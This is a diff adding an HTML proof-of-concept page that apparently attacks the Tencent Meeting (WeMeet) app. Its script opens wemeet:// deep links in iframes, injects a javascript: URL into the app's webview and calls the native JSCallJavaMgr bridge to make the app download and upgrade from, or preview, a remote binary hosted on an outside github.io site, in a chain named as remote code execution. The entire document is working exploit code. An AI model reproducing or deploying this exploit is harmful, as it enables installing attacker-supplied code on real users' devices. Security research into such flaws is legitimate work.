@@ -1,0 +1,19 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P32</h1>
+<script>
+document.title='P32L-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var bin='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+var js="javascript:(function(){document.title='P32INJ:'+location.host;window.__p=function(r){try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}document.title='P32CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,40)};function c(m,e,p){window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:m+'.'+e}))}c('CommonPlugin','LoadUrl',{url:'wemeet://page/package_download?url="+bin+"'});setTimeout(function(){c('CommonPlugin','LoadUrl',{url:'wemeet://page/premeeting/schedule_plugin_download?url="+bin+"'})},500);setTimeout(function(){c('CommonPlugin','LoadUrl',{url:'wemeet://page/upgrade_app?url="+bin+"'})},1000);setTimeout(function(){c('CommonPlugin','LoadUrl',{url:'wemeet://page/chat_file_preview?im_file_path="+bin+"'})},1500)})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P32L-OFFICIAL'); }, 600);
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(js),'P32L-JSINJ'); }, 12000);
+setTimeout(function(){ document.title='P32L-DONE'; }, 24000);
+</script>
+</body></html>
